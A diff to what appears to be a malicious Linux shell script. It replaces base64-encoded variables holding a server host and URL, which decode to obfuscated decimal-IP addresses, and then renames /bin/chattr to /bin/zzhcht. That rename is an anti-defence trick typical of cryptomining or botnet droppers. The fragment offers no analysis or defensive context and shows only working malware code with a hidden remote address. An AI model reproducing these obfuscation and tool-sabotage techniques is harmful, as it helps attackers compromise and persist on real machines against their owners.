@@ -1,7 +1,7 @@
 #!/bin/bash
 #variables
-domain=$(echo MzExNDM1NDI0Mwo=|base64 -d)
-mainurl=$(echo aHR0cDovLzMxMTQzNTQyNDMvYjJmNjI4Cg==|base64 -d)
+domain=$(echo NzY0NDc5NDg1|base64 -d)
+mainurl=$(echo aHR0cDovLzc2NDQ3OTQ4NS9iMmY2MjgK|base64 -d)
 #mv command
 if [ -x /bin/chattr ];then
     mv /bin/chattr /bin/zzhcht
